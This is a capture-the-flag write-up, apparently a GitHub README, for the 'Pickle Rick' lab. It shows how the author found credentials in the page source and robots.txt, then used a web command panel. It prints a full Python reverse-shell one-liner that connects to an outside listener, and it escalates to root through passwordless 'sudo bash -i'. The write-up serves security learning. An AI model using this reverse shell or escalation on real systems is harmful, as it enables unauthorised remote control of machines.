# Pickle-Rick
A CTF exploiting a vulnerable web server

### Enumeration

The first step I took was going to the webpage and view the page source to see if there was any useful information. Here I found a username was hidden the source code.

Website
![website](https://github.com/lindseytwilson/Pickle-Rick/blob/main/Images/Webpage.png)

The username shown was: R1ckRul3s
Username
![username](https://github.com/lindseytwilson/Pickle-Rick/blob/main/Images/Page%20Source.png)

After finding the username I ran gobuster to see if there were any additional webpages to exploit. This showed a robots.txt file that I navigated to.
![gobuster](https://github.com/lindseytwilson/Pickle-Rick/blob/main/Images/Gobuster.png)

The robots.txt page showed a password that I then used to login to the login.php page that was also found when I ran gobuster.
The password shown was: Wubbalubbadubdub
![robots](https://github.com/lindseytwilson/Pickle-Rick/blob/main/Images/Robots.png)
![login page](https://github.com/lindseytwilson/Pickle-Rick/blob/main/Images/Portal%20Login%20Page.png)

Once logged in I found a command line that I ran a ls -al in. Here I found that there was a file named Sup3rS3cretPickl3Ingred.txt. I tried to cat the file but ran into a message saying the command was disabled.
![ls -al](https://github.com/lindseytwilson/Pickle-Rick/blob/main/Images/ls%20-al.png)
![cat file](https://github.com/lindseytwilson/Pickle-Rick/blob/main/Images/Trying%20to%20cat.png)

Since there was a command line, I decided that the best approach would be to set up a netcat listener and try to get a reverse shell to exploit the webpage.

The first step was to find what python is running on the system, which was python3. Then I went to pentestmonkey.net to find a python reverse shell script. The script I found was: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
I had to change python to by python3, change the ip address to my kali machine ip address, and lastly I changed the listening port to 9001.

![which python](https://github.com/lindseytwilson/Pickle-Rick/blob/main/Images/Which%20Python.png)

###Ingredient 1
I started a netcat listener on port 9001 and then concatenated the Sup3rS3cretPickl3Ingred.txt file. This showed that the first ingredient needed is mr. meeseek hair
![ingredient 1](https://github.com/lindseytwilson/Pickle-Rick/blob/main/Images/Ingredient%201.png)

###Ingredient 2
To find ingredient 2 I went to the root directory, ran an ls, went into the home directory, then into user rick, and ran a ls on the second ingredients file to find that the second ingredient is jerry tear.
![ingredient 2](https://github.com/lindseytwilson/Pickle-Rick/blob/main/Images/Ingredient%202.png)

###Ingredient 3
The final ingredient appears to be in the root folder, which I do not have access to. Running a sudo -l shows that all commands can be run without needing a password.
Running sudo bash -i allows me to run a super user shell to move into the root folder. Once in the root folder I was able to run a ls and cat the 3rd.txt file, showing the final ingredient is fleeb juice.
![moving to root](https://github.com/lindseytwilson/Pickle-Rick/blob/main/Images/Move%20to%20Root.png)
![ingredient 3](https://github.com/lindseytwilson/Pickle-Rick/blob/main/Images/Ingredient%203.png)
